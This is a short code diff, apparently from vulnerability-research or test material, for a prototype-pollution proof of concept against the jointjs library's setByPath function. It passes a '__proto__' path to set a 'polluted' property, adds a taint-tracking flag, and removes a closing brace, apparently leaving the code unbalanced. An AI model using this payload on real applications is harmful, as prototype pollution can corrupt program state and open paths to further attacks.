@@ -3,10 +3,9 @@
    
 
   const jointjs = require("jointjs");
+  jointjs.util.setByPath.__x_toTaint = true;
   jointjs.util.setByPath({}, [["__proto__"], "polluted"], "yes");
 
-   
-});
 
 // jointjs.util.setByPath({}, 'proto/polluted', 'yes');
 // jointjs.util.setByPath({}, ['proto', 'polluted'], 'yes');
